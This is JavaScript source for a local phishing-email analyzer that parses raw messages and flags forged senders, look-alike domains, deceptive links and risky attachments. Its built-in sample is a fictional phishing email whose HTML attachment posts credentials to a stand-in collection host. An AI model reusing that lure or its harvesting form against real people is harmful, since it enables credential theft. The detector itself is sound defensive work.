(function(){
"use strict";
var $=function(i){return document.getElementById(i)};
function el(t,c,x){var e=document.createElement(t);if(c)e.className=c;if(x!==undefined&&x!==null)e.textContent=String(x);return e}

/* ================= MIME parsing ================= */
function bytesToText(bytes,charset){
  try{return new TextDecoder(charset||"utf-8").decode(bytes)}catch(e){try{return new TextDecoder("utf-8").decode(bytes)}catch(e2){return ""}}
}
function b64bytes(s){
  try{var bin=atob(s.replace(/[^A-Za-z0-9+\/=]/g,"")),u=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);return u}catch(e){return new Uint8Array(0)}
}
function qpbytes(s,isHeader){
  if(isHeader)s=s.replace(/_/g," ");
  s=s.replace(/=\r?\n/g,"");
  var out=[],i=0;
  while(i<s.length){
    var c=s[i];
    if(c==="="&&/^[0-9A-Fa-f]{2}$/.test(s.substr(i+1,2))){out.push(parseInt(s.substr(i+1,2),16));i+=3}
    else{var code=s.charCodeAt(i);if(code<256)out.push(code);else{var enc=new TextEncoder().encode(c);for(var k=0;k<enc.length;k++)out.push(enc[k])}i++}
  }
  return new Uint8Array(out);
}
function decodeWords(s){
  if(!s)return "";
  s=s.replace(/(\?=)\s+(=\?)/g,"$1$2");
  return s.replace(/=\?([^?\s]+)\?([BbQq])\?([^?]*)\?=/g,function(_,cs,enc,data){
    return bytesToText(enc.toUpperCase()==="B"?b64bytes(data):qpbytes(data,true),cs);
  });
}
function parseHeaderBlock(block){
  var lines=block.split(/\r?\n/),H=[];
  lines.forEach(function(l){
    if(/^[ \t]/.test(l)&&H.length)H[H.length-1][1]+=" "+l.trim();
    else{var i=l.indexOf(":");if(i>0)H.push([l.slice(0,i).trim().toLowerCase(),l.slice(i+1).trim()])}
  });
  return H;
}
function hget(H,name){for(var i=0;i<H.length;i++)if(H[i][0]===name)return H[i][1];return ""}
function hall(H,name){return H.filter(function(h){return h[0]===name}).map(function(h){return h[1]})}
function params(v){
  var o={},parts=v.split(";");o._=parts.shift().trim().toLowerCase();
  parts.forEach(function(p){var i=p.indexOf("=");if(i>0){var k=p.slice(0,i).trim().toLowerCase().replace(/\*$/,""),val=p.slice(i+1).trim().replace(/^"|"$/g,"");
    if(/^[\w-]+''/.test(val)){try{val=decodeURIComponent(val.replace(/^[\w-]+''/,""))}catch(e){}}
    o[k]=decodeWords(val)}});
  return o;
}
function parsePart(text,depth,out){
  var m=/\r?\n\r?\n/.exec(text),head=m?text.slice(0,m.index):text,body=m?text.slice(m.index+m[0].length):"";
  var H=parseHeaderBlock(head),ct=params(hget(H,"content-type")||"text/plain"),cd=params(hget(H,"content-disposition")||""),cte=(hget(H,"content-transfer-encoding")||"").toLowerCase().trim();
  if(depth===0)out.headers=H;
  if(ct._.indexOf("multipart/")===0&&ct.boundary&&depth<8){
    var chunks=body.split(new RegExp("(?:^|\\r?\\n)--"+ct.boundary.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")+"(?:--)?[ \\t]*(?:\\r?\\n|$)"));
    chunks.slice(1).forEach(function(c){if(c.trim())parsePart(c,depth+1,out)});
    return;
  }
  var filename=cd.filename||ct.name||"",isAttach=cd._==="attachment"||(!!filename&&ct._.indexOf("text/")!==0);
  var bytes=cte==="base64"?b64bytes(body):cte==="quoted-printable"?qpbytes(body,false):null;
  if(ct._==="message/rfc822"){out.attachments.push({name:filename||"attached message",type:ct._,size:body.length});return}
  if(isAttach||ct._.indexOf("text/")!==0){
    var a={name:filename||"(unnamed "+ct._+")",type:ct._,size:bytes?bytes.length:body.length,inline:cd._==="inline"||!!hget(H,"content-id")};
    if(/html|svg/.test(ct._)||/\.(html?|svg|shtml|xhtml)$/i.test(filename))a.text=bytes?bytesToText(bytes,ct.charset):body;
    out.attachments.push(a);return;
  }
  var txt=bytes?bytesToText(bytes,ct.charset):body;
  if(ct._==="text/html")out.html.push(txt);else out.text.push(txt);
}
function parseMail(raw){
  var out={headers:[],html:[],text:[],attachments:[]};
  parsePart(raw.replace(/^﻿/,"").replace(/^\s+/,""),0,out);
  return out;
}

/* ================= helpers ================= */
var TLD2=/\.(co|com|org|net|ac|gov|edu)\.[a-z]{2}$/i;
function regDomain(host){
  host=String(host||"").toLowerCase().replace(/\.$/,"");
  if(/^\d+\.\d+\.\d+\.\d+$/.test(host)||host.indexOf(":")>-1)return host;
  var p=host.split(".");if(p.length<=2)return host;
  return TLD2.test(host)?p.slice(-3).join("."):p.slice(-2).join(".");
}
function addr(v){
  v=decodeWords(v||"");
  // the real address is the last <...>; a quoted display name may contain a decoy one
  var all=v.match(/<([^<>\s]+@[^<>\s]+)>/g),m=all?all[all.length-1]:null,a=m?m.slice(1,-1):(/[^\s<>"',;]+@[^\s<>"',;]+/.exec(v)||[""])[0];
  var name=m?v.slice(0,v.lastIndexOf(m)).trim().replace(/^"|"$/g,"").trim():"";
  a=a.toLowerCase();
  return {raw:v,name:name,addr:a,domain:a.split("@")[1]||""};
}
function lev(a,b){
  if(Math.abs(a.length-b.length)>2)return 9;
  var p=[],i,k;for(k=0;k<=b.length;k++)p[k]=k;
  for(i=1;i<=a.length;i++){var prev=p[0];p[0]=i;for(k=1;k<=b.length;k++){var t=p[k];p[k]=Math.min(p[k]+1,p[k-1]+1,prev+(a[i-1]===b[k-1]?0:1));prev=t}}
  return p[b.length];
}
function defang(u){return String(u).replace(/^http/i,"hxxp").replace(/\./g,"[.]")}
var BRANDS=[
 ["microsoft",["microsoft","office 365","office365","outlook","sharepoint","onedrive","microsoft 365","azure","msn "],["microsoft.com","microsoftonline.com","office.com","office365.com","outlook.com","live.com","sharepoint.com","onmicrosoft.com","windows.net","azure.com","microsoft365.com","msn.com","hotmail.com"]],
 ["paypal",["paypal"],["paypal.com","paypal.de","paypal.me"]],
 ["dhl",["dhl"],["dhl.com","dhl.de"]],
 ["amazon",["amazon"],["amazon.com","amazon.de","amazon.co.uk","amazonaws.com","amazon.fr","amazon.es","amazon.it"]],
 ["apple",["apple","icloud"],["apple.com","icloud.com"]],
 ["google",["google","gmail"],["google.com","gmail.com","googlemail.com","youtube.com"]],
 ["docusign",["docusign"],["docusign.com","docusign.net"]],
 ["dropbox",["dropbox"],["dropbox.com","dropboxmail.com"]],
 ["netflix",["netflix"],["netflix.com"]],
 ["linkedin",["linkedin"],["linkedin.com"]],
 ["fedex",["fedex"],["fedex.com"]],
 ["ups",["ups "],["ups.com"]],
 ["adobe",["adobe"],["adobe.com"]]
];
function unleet(s){return s.toLowerCase().replace(/0/g,"o").replace(/1/g,"l").replace(/3/g,"e").replace(/5/g,"s").replace(/rn/g,"m").replace(/vv/g,"w").replace(/[-_.]/g,"")}
function brandIn(text){
  var t=" "+String(text||"").toLowerCase()+" ";
  for(var i=0;i<BRANDS.length;i++)for(var k=0;k<BRANDS[i][1].length;k++)if(t.indexOf(BRANDS[i][1][k])>-1)return BRANDS[i];
  return null;
}
function brandLookalike(host){
  var reg=regDomain(host),flat=unleet(host);
  for(var i=0;i<BRANDS.length;i++){
    var b=BRANDS[i];if(b[2].indexOf(reg)>-1)return null;
    if(flat.indexOf(b[0])>-1)return b[0];
  }
  return null;
}
var SHORT={"bit.ly":1,"tinyurl.com":1,"t.co":1,"goo.gl":1,"ow.ly":1,"is.gd":1,"buff.ly":1,"rebrand.ly":1,"cutt.ly":1,"shorturl.at":1,"t.ly":1,"rb.gy":1,"lnkd.in":1,"tiny.cc":1,"s.id":1,"qrco.de":1};
var RISKY=/\.(exe|scr|com|bat|cmd|js|jse|vbs|vbe|wsf|hta|lnk|iso|img|vhd|vhdx|msi|ps1|jar|one|chm|cpl|reg|dll|html?|shtml|svg|docm|xlsm|pptm|xll|appx|msix)$/i;
var ARCHIVE=/\.(zip|rar|7z|gz|tar|cab|ace)$/i;
var CUES=[/verify your (account|identity|mailbox)/i,/(password|account|mailbox).{0,30}(expire|suspend|deactivat|lock|disabl)/i,/within (24|48|72) hours/i,/unusual (sign-?in|activity)/i,/click (here|below|the link)/i,/(urgent|immediately|action required)/i,/gift ?cards?/i,/wire transfer|bank details have changed|new bank account/i,/kindly/i,/(invoice|payment|remittance).{0,20}(attached|overdue|pending)/i,/confirm your (details|password|payment)/i,/mailbox (is )?(full|quota)/i,/(konto|postfach).{0,30}(gesperrt|deaktiviert|läuft ab)/i,/dringend|umgehend|sofort handeln/i];

/* ================= analysis ================= */
function unwrap(href){
  // follow the common rewriting services to the real target
  try{
    var u=new URL(href),h=u.hostname.toLowerCase();
    if(/safelinks\.protection\.outlook\.com$/.test(h)&&u.searchParams.get("url"))return {url:u.searchParams.get("url"),via:"Microsoft Safe Links"};
    if(/^(www\.)?google\.[a-z.]+$/.test(h)&&u.pathname==="/url"&&(u.searchParams.get("q")||u.searchParams.get("url")))return {url:u.searchParams.get("q")||u.searchParams.get("url"),via:"Google redirect"};
    if(/linkprotect\.cudasvc\.com$/.test(h)&&u.searchParams.get("a"))return {url:u.searchParams.get("a"),via:"Barracuda link protection"};
  }catch(e){}
  return null;
}
function analyseLink(text,href,F){
  var L={text:text,href:href,flags:[],sev:""},w=unwrap(href);
  function flag(sev,msg){L.flags.push(msg);var o={crit:0,high:1,med:2,low:3};if(!L.sev||o[sev]<o[L.sev])L.sev=sev}
  if(w){L.via=w.via;href=w.url;L.target=w.url}
  var u;try{u=new URL(href)}catch(e){flag("low","not a valid URL");return L}
  if(!/^https?:$/.test(u.protocol)){
    if(/^(javascript|data|vbscript|file):$/.test(u.protocol))flag("high","uses a "+u.protocol+" link, which runs or opens content instead of visiting a site");
    return L;
  }
  var host=u.hostname.toLowerCase(),reg=regDomain(host);L.host=host;L.reg=reg;
  var tm=/(?:https?:\/\/)?((?:[a-z0-9-]+\.)+[a-z]{2,})(?:[\/:?#]|$)/i.exec(String(text||"").trim());
  if(tm&&/[a-z]/i.test(tm[1])&&regDomain(tm[1])!==reg&&!w)flag("high","the text shows "+tm[1].toLowerCase()+" but the link goes to "+host);
  if(/^\d+\.\d+\.\d+\.\d+$/.test(host))flag("high","points to a bare IP address");
  if(/(^|\.)xn--/.test(host))flag("high","punycode domain (may imitate another name with look-alike characters)");
  if(u.username||u.password)flag("high","contains user info before an @ sign, which hides the real host");
  if(SHORT[reg])flag("med","URL shortener: the real destination is hidden");
  var bl=brandLookalike(host);if(bl)flag("high","mentions “"+bl+"” but the registered domain is "+reg);
  if(RISKY.test(u.pathname)&&!/\.html?$/i.test(u.pathname))flag("med","links directly to a file of a risky type");
  if(u.protocol==="http:")flag("low","unencrypted http");
  if(host.split(".").length>=5)flag("low","unusually deep subdomain chain");
  var tail=u.pathname+u.search+u.hash;try{tail=decodeURIComponent(tail)}catch(e){}
  if(/[\w.+-]+@[\w-]+\.[a-z]{2,}/i.test(tail))flag("low","an email address is embedded in the link (often used to pre-fill a fake sign-in)");
  return L;
}
function analyse(mail){
  var H=mail.headers,F=[],R={findings:F,links:[],attachments:mail.attachments,facts:[],score:0};
  function find(sev,title,text){F.push({sev:sev,title:title,text:text})}
  var from=addr(hget(H,"from")),reply=addr(hget(H,"reply-to")),rpath=addr(hget(H,"return-path")),subject=decodeWords(hget(H,"subject")),to=addr(hget(H,"to"));
  R.from=from;R.subject=subject;
  [["From",from.raw],["Reply-To",reply.raw],["Return-Path",rpath.addr],["To",to.raw],["Subject",subject],["Date",hget(H,"date")],["Message-ID",hget(H,"message-id")]].forEach(function(f){if(f[1])R.facts.push(f)});
  if(!from.addr)find("med","No readable From address","The message has no parsable sender. Either the file is not a raw email, or the header is malformed on purpose.");

  // --- authentication
  var ar=hall(H,"authentication-results").join(" ; "),res={};
  ["spf","dkim","dmarc"].forEach(function(k){var m=new RegExp("\\b"+k+"=(\\w+)","i").exec(ar);res[k]=m?m[1].toLowerCase():""});
  R.auth=res;
  if(!ar){var rs=hget(H,"received-spf");if(rs)res.spf=rs.split(/\s/)[0].toLowerCase()}
  R.facts.push(["SPF / DKIM / DMARC",["spf","dkim","dmarc"].map(function(k){return k+"="+(res[k]||"not recorded")}).join("  ")]);
  if(res.dmarc==="fail")find("crit","DMARC failed","The receiving server checked whether this mail really comes from "+(from.domain||"the From domain")+" and it does not. The visible sender is forged.");
  else{
    if(res.spf==="fail"||res.spf==="softfail")find("high","SPF "+res.spf,"The sending server is not on the list of servers allowed to send for the envelope domain.");
    if(res.dkim==="fail")find("high","DKIM failed","The signature does not match: the message was altered in transit or the signature is forged.");
  }
  if(res.dmarc==="pass"||(res.spf==="pass"&&res.dkim==="pass"))R.authNote="Authentication passes for "+(from.domain||"the sending domain")+". That proves the sender controls that domain, nothing more: phishing sent from a look-alike or a compromised real mailbox passes too.";
  if(!ar&&!res.spf)find("info","No authentication results in the headers","The file contains no Authentication-Results header, so SPF, DKIM and DMARC cannot be judged. This is normal for a message saved from Sent Items, or one that was copied rather than saved as received.");

  // --- sender identity
  var fromReg=regDomain(from.domain);
  var inName=/[^\s<>"]+@[^\s<>"]+\.[a-z]{2,}/i.exec(from.name||"");
  if(inName&&inName[0].toLowerCase()!==from.addr)find("high","Display name shows a different address","The name field reads “"+from.name+"” but the real sender is "+from.addr+". Mail apps that show only the name will display the fake address.");
  var b=brandIn(from.name);
  if(b&&from.domain&&b[2].indexOf(fromReg)<0)find("high","Sender name claims to be "+b[0].charAt(0).toUpperCase()+b[0].slice(1),"The display name is “"+from.name+"”, but the address is at "+from.domain+", which is not one of that company's domains.");
  var bl=from.domain&&brandLookalike(from.domain);
  if(bl)find("high","Sender domain imitates "+bl,from.domain+" contains “"+bl+"” (possibly with swapped characters) but is not a domain of that company.");
  if(/(^|\.)xn--/.test(from.domain))find("high","Sender domain is punycode",from.domain+" is an internationalised domain. These are used to imitate known names with look-alike characters.");
  var replyReg=regDomain(reply.domain),toReg=regDomain(to.domain);
  if(reply.addr&&replyReg!==fromReg&&fromReg&&lev(replyReg,fromReg)<=2)find("high","Reply-To is a look-alike of the sender's domain",replyReg+" differs from "+fromReg+" by one or two characters. The mail may be genuine or forged, but the answer goes to someone who registered a near-identical domain. This is the classic set-up for payment fraud.");
  else if(reply.addr&&regDomain(reply.domain)!==fromReg)find("med","Replies go somewhere else","From is at "+from.domain+", but a reply would go to "+reply.addr+". Common in payment fraud: the mail looks internal, the answer leaves the company.");
  if(rpath.addr&&from.domain&&regDomain(rpath.domain)!==fromReg)find("low","Envelope sender differs from From","Return-Path is at "+rpath.domain+". Normal for newsletters and mailing services, worth a look for anything that claims to be personal.");
  if(toReg&&fromReg&&toReg!==fromReg&&lev(toReg,fromReg)<=2)find("high","Sender domain is a look-alike of the recipient's domain",fromReg+" is one or two characters away from "+toReg+". It is meant to pass for an internal address.");
  if(to.domain&&from.domain&&regDomain(to.domain)===fromReg&&(res.dmarc==="fail"||res.spf==="fail"||res.spf==="softfail"))find("high","Looks internal, but failed authentication","The sender uses your own domain and did not pass the checks. Someone outside is pretending to be a colleague.");

  // --- body
  var doc=null,htmlText="",bodyText=mail.text.join("\n");
  if(mail.html.length){doc=new DOMParser().parseFromString(mail.html.join("\n"),"text/html");htmlText=doc.body?doc.body.textContent:""}
  var allText=(subject+"\n"+bodyText+"\n"+htmlText).replace(/\s+/g," ");
  var seen={};
  function addLink(text,href){
    href=String(href||"").trim();if(!href||/^(mailto:|tel:|#|cid:)/i.test(href))return;
    var key=href+"|"+text;if(seen[key])return;seen[key]=1;
    R.links.push(analyseLink(text,href,F));
  }
  if(doc){
    doc.querySelectorAll("a[href],area[href]").forEach(function(a){addLink((a.textContent||"").replace(/\s+/g," ").trim().slice(0,120),a.getAttribute("href"))});
    var forms=doc.querySelectorAll("form"),pw=doc.querySelectorAll("input[type=password]");
    if(forms.length)find("high","The message contains a form","Legitimate mail does not ask you to type into the message itself."+(pw.length?" This one has a password field.":"")+(forms[0].getAttribute("action")?" It submits to "+defang(forms[0].getAttribute("action"))+".":""));
    if(doc.querySelectorAll("script").length)find("med","The message contains script","Mail clients do not run script, so it is either left over from a phishing kit or meant for when the content is opened as a file.");
    var imgs=doc.querySelectorAll("img"),remote=[].filter.call(imgs,function(i){return /^https?:/i.test(i.getAttribute("src")||"")}).length;
    if(remote)R.facts.push(["Remote images",remote+" (loading them tells the sender the mail was opened)"]);
    if(imgs.length&&htmlText.replace(/\s/g,"").length<40&&bodyText.replace(/\s/g,"").length<40)find("med","Image-only message","Almost no text, only pictures. This hides the content from text filters, and is typical of QR-code phishing: check whether the image is a code to scan.");
    var hidden=doc.querySelectorAll('[style*="display:none"],[style*="display: none"],[style*="font-size:0"],[style*="font-size: 0"]');
    if(hidden.length>3)find("low","Hidden text in the message",hidden.length+" elements are invisible. Often filler words meant to confuse spam filters.");
  }
  (bodyText.match(/https?:\/\/[^\s<>"')\]]+/gi)||[]).forEach(function(u){addLink("",u.replace(/[.,;:!?]+$/,""))});
  var bad=R.links.filter(function(l){return l.sev==="high"||l.sev==="crit"}),medl=R.links.filter(function(l){return l.sev==="med"});
  if(bad.length)find("high",bad.length===1?"A link is not what it seems":bad.length+" links are not what they seem",bad.slice(0,3).map(function(l){return l.flags[0]}).join("; ")+".");
  else if(medl.length)find("med","Links hide their destination",medl[0].flags[0]+".");
  var cues=CUES.filter(function(r){return r.test(allText)}).length;
  if(cues>=3)find("med","Pressure and credential language",cues+" typical phrases found (urgency, account suspension, payment or sign-in requests). The wording is doing the work that authenticity cannot.");
  else if(cues)find("low","Some pressure language",cues+" typical phishing phrase"+(cues===1?"":"s")+" found.");

  // --- attachments
  mail.attachments.forEach(function(a){
    var n=a.name||"";a.flags=[];
    if(/\.[a-z0-9]{2,4}\.(exe|scr|js|vbs|html?|lnk|iso|bat|cmd|com|hta)$/i.test(n)){a.flags.push("double extension");find("high","Attachment with a double extension",n+" pretends to be one file type and is another.")}
    else if(/\.(html?|shtml|svg)$/i.test(n)||/html|svg/.test(a.type)){a.flags.push("HTML or SVG file");find("high","HTML or SVG attachment",n+" opens in the browser from the local disk, where mail and web filters do not see it. This is how fake sign-in pages are smuggled past gateways."+(a.text&&/<form|password|atob\(|document\.write|window\.location/i.test(a.text)?" The file contains a form, a redirect or encoded script.":""))}
    else if(RISKY.test(n)){a.flags.push("risky type");find("high","Attachment of a risky type",n+" can run code when opened.")}
    else if(ARCHIVE.test(n)){a.flags.push("archive");find(/password|passwort|kennwort/i.test(allText)?"high":"med","Archive attachment",n+(/password|passwort|kennwort/i.test(allText)?" and the text mentions a password: an encrypted archive that scanners cannot open.":" hides its contents from a quick look. Check what is inside before anyone opens it."))}
    else if(/\.(docx?|xlsx?|pptx?|pdf|rtf)$/i.test(n))a.flags.push("document");
  });

  // --- route
  var rec=hall(H,"received");
  if(rec.length){
    R.hops=rec.slice().reverse().map(function(r){return (/(?:from\s+)(\S+)/i.exec(r)||["","?"])[1]+" → "+(/(?:by\s+)(\S+)/i.exec(r)||["","?"])[1]});
    var first=rec[rec.length-1],ip=/\[(\d+\.\d+\.\d+\.\d+)\]/.exec(first);
    if(ip)R.facts.push(["Originating server",(/(?:from\s+)(\S+)/i.exec(first)||["",""])[1]+" ["+ip[1]+"]"]);
  }
  var W={crit:45,high:25,med:10,low:4,info:0},order={crit:0,high:1,med:2,low:3,info:4};
  F.forEach(function(f){R.score+=W[f.sev]});R.score=Math.min(100,R.score);
  F.sort(function(a,b){return order[a.sev]-order[b.sev]});
  R.verdict=R.score>=60?["Likely phishing","crit"]:R.score>=25?["Suspicious","high"]:R.score>=10?["A few weak signals","med"]:["No strong signs of phishing","info"];
  return R;
}

/* ================= output ================= */
var SEVN={crit:"critical",high:"high",med:"medium",low:"low",info:"info"},SEVC={crit:"crit",high:"high",med:"med",low:"info",info:"info"};
var last=null;
function summary(R){
  var L=["Verdict: "+R.verdict[0]+" (score "+R.score+"/100)","Subject: "+(R.subject||"(none)"),"From: "+(R.from.raw||"(none)"),""];
  if(R.findings.length){L.push("Findings:");R.findings.filter(function(f){return f.sev!=="info"}).forEach(function(f){L.push("- ["+SEVN[f.sev]+"] "+f.title+": "+f.text)})}
  var bad=R.links.filter(function(l){return l.flags.length});
  if(bad.length){L.push("","Links (defanged):");bad.forEach(function(l){L.push("- "+defang(l.target||l.href)+"  ("+l.flags.join("; ")+")")})}
  if(R.attachments.length){L.push("","Attachments:");R.attachments.forEach(function(a){L.push("- "+a.name+" ("+a.type+", "+Math.round(a.size/1024)+" KB)"+(a.flags&&a.flags.length?"  "+a.flags.join(", "):""))})}
  L.push("","Analysed locally with the admin_hub phish analyzer. A triage aid, not proof.");
  return L.join("\n");
}
function table(cols,rows){
  var w=el("div","tw"),t=el("table","tbl rec"),tb=el("tbody");
  if(cols){var th=el("thead"),tr=el("tr");cols.forEach(function(c){tr.append(el("th",null,c))});th.append(tr);t.append(th)}
  rows.forEach(function(r){var tr=el("tr");r.forEach(function(c){if(c&&c.nodeType)tr.append(c);else tr.append(el("td",null,c))});tb.append(tr)});
  t.append(tb);w.append(t);return w;
}
function render(R,name){
  last=R;
  var out=$("pa-out");out.replaceChildren();
  $("pa-status").textContent="Analysed "+name+".";
  var v=el("div","verdict v-"+R.verdict[1]);v.append(el("b",null,R.verdict[0]),el("span",null,"score "+R.score+" of 100 · "+R.findings.filter(function(f){return f.sev!=="info"}).length+" findings"));out.append(v);
  var stats=el("div","stats");
  [["links",R.links.length,R.links.filter(function(l){return l.flags.length}).length+" flagged"],["attachments",R.attachments.length,R.attachments.filter(function(a){return a.flags&&a.flags.length&&a.flags[0]!=="document"}).length+" risky"],["dmarc",R.auth.dmarc||"n/a","spf "+(R.auth.spf||"n/a")+" · dkim "+(R.auth.dkim||"n/a")],["sender",R.from.domain||"unknown",R.from.name||""]].forEach(function(s){var d=el("div","stat");d.append(el("span","stat-k",s[0]),el("b","stat-v",s[1]),el("span","stat-s",s[2]));stats.append(d)});
  out.append(stats);
  out.append(el("h2",null,"findings"));
  if(!R.findings.length)out.append(el("p","dim","None of the checks matched."));
  R.findings.forEach(function(f,i){
    var d=el("details","finding f-"+SEVC[f.sev]);if(i<4&&f.sev!=="info"&&f.sev!=="low")d.open=true;
    var s=el("summary");s.append(el("span","sevtag",SEVN[f.sev]),el("b",null,f.title));d.append(s,el("p",null,f.text));out.append(d);
  });
  if(R.authNote)out.append(el("p","note",R.authNote));
  if(R.links.length){
    out.append(el("h2",null,"links"),el("p","dim","Shown defanged (hxxp, [.]) so they cannot be clicked by accident."));
    out.append(table(["Shown as","Really goes to","Notes"],R.links.map(function(l){
      var td=el("td");if(l.flags.length){td.append(el("span","sevtag s-"+SEVC[l.sev||"info"],SEVN[l.sev||"info"])," ");td.append(document.createTextNode(l.flags.join("; ")))}else td.textContent="nothing unusual";
      return [l.text||"(no text)",defang(l.target||l.href)+(l.via?"  (wrapped by "+l.via+")":""),td];
    })));
  }
  if(R.attachments.length){
    out.append(el("h2",null,"attachments"));
    out.append(table(["Name","Type","Size","Notes"],R.attachments.map(function(a){return [a.name,a.type,a.size>1024?Math.round(a.size/1024)+" KB":a.size+" B",(a.flags||[]).join(", ")||(a.inline?"inline image":"")]})));
  }
  out.append(el("h2",null,"headers"));out.append(table(null,R.facts));
  if(R.hops&&R.hops.length){var det=el("details");det.append(el("summary",null,"delivery path ("+R.hops.length+" hops, oldest first)"),el("pre",null,R.hops.map(function(h,i){return (i+1)+"  "+h}).join("\n")));out.append(det)}
  var ctl=el("div","ctl");ctl.style.marginTop="24px";
  var cp=el("button","btn","Copy summary for the ticket");cp.type="button";cp.addEventListener("click",function(){if(navigator.clipboard)navigator.clipboard.writeText(summary(R)).then(function(){cp.textContent="Copied";setTimeout(function(){cp.textContent="Copy summary for the ticket"},1400)})});
  ctl.append(cp);out.append(ctl);
  out.hidden=false;
}
function load(raw,name){
  var st=$("pa-status");
  if(/\.msg$/i.test(name)){st.textContent="That is an Outlook .msg file, a binary format this page cannot read. In Outlook, use File, Save As and choose a text or .eml format, or forward the mail as an attachment and save that attachment.";$("pa-out").hidden=true;return}
  var mail=parseMail(raw);
  if(!mail.headers.length||(!hget(mail.headers,"from")&&!hget(mail.headers,"received")&&!hget(mail.headers,"subject"))){st.textContent="That does not look like a raw email. Paste the complete message source (headers and body), or drop an .eml file.";$("pa-out").hidden=true;return}
  render(analyse(mail),name);
  $("pa-out").scrollIntoView({behavior:"smooth",block:"start"});
}
function sample(){
  var html='<html><body style="font-family:Segoe UI"><p>Dear user,</p><p>We detected an <b>unusual sign-in</b> to your account. Your mailbox will be suspended within 24 hours unless you verify your account.</p><p><a href="http://login.microsoftonline.com.account-verify.example/common/oauth2/?login_hint=marta@contoso.example">https://login.microsoftonline.com/</a></p><p>Or use the short link: <a href="https://bit.ly/3xAmPle">Review activity</a></p><p>Kindly complete this immediately. The details are in the attached file.</p><p>Microsoft 365 Security Team</p><img src="http://track.account-verify.example/o.gif?u=marta" width="1" height="1"></body></html>';
  var att=btoa('<html><body><form action="https://collect.account-verify.example/p.php"><input name="u"><input type="password" name="p"></form><script>document.write(atob("PGI+U2lnbiBpbjwvYj4="))</script></body></html>');
  return ['Return-Path: <bounce-7741@mailer.account-verify.example>',
'Received: from mx.contoso.example (10.0.0.5) by mbx01.contoso.example with ESMTPS; Fri, 2 Oct 2026 15:41:07 +0000',
'Received: from mailer.account-verify.example (mailer.account-verify.example [203.0.113.77]) by mx.contoso.example with ESMTP; Fri, 2 Oct 2026 15:41:05 +0000',
'Authentication-Results: mx.contoso.example; spf=pass smtp.mailfrom=mailer.account-verify.example; dkim=none; dmarc=fail action=none header.from=micros0ft-support.example',
'From: "Microsoft 365 Security <security@microsoft.com>" <no-reply@micros0ft-support.example>',
'Reply-To: helpdesk@account-verify.example',
'To: marta@contoso.example',
'Subject: =?UTF-8?B?QWN0aW9uIHJlcXVpcmVkOiB1bnVzdWFsIHNpZ24taW4gYWN0aXZpdHk=?=',
'Date: Fri, 2 Oct 2026 15:41:03 +0000',
'Message-ID: <20261002154103.7741@mailer.account-verify.example>',
'MIME-Version: 1.0',
'Content-Type: multipart/mixed; boundary="b1_outer"',
'',
'--b1_outer',
'Content-Type: multipart/alternative; boundary="b2_alt"',
'',
'--b2_alt',
'Content-Type: text/plain; charset=utf-8',
'Content-Transfer-Encoding: quoted-printable',
'',
'Dear user, we detected an unusual sign-in. Verify your account within 24 =',
'hours: http://login.microsoftonline.com.account-verify.example/common/',
'',
'--b2_alt',
'Content-Type: text/html; charset=utf-8',
'Content-Transfer-Encoding: base64',
'',
btoa(html).replace(/(.{76})/g,"$1\r\n"),
'',
'--b2_alt--',
'--b1_outer',
'Content-Type: text/html; name="Secure_Message_4471.pdf.html"',
'Content-Disposition: attachment; filename="Secure_Message_4471.pdf.html"',
'Content-Transfer-Encoding: base64',
'',
att.replace(/(.{76})/g,"$1\r\n"),
'',
'--b1_outer--',''].join("\r\n");
}
window.phishSample=sample;window.phishAnalyse=function(raw){return analyse(parseMail(raw))};window.phishSummary=function(){return last?summary(last):""};

var drop=$("pa-drop"),file=$("pa-file"),ta=$("pa-text");
function readFile(f){if(!f)return;var r=new FileReader();r.onload=function(){load(String(r.result),f.name)};r.readAsText(f)}
file.addEventListener("change",function(){readFile(file.files[0]);file.value=""});
["dragenter","dragover"].forEach(function(n){drop.addEventListener(n,function(e){e.preventDefault();drop.classList.add("over")})});
["dragleave","drop"].forEach(function(n){drop.addEventListener(n,function(e){e.preventDefault();drop.classList.remove("over")})});
drop.addEventListener("drop",function(e){readFile(e.dataTransfer.files[0])});
$("pa-run").addEventListener("click",function(){if(ta.value.trim())load(ta.value,"the pasted message");else $("pa-status").textContent="Paste the message source first, or drop a file."});
$("pa-sample").addEventListener("click",function(){load(sample(),"the sample message (fictional)")});
if(location.hash==="#sample")load(sample(),"the sample message (fictional)");
})();
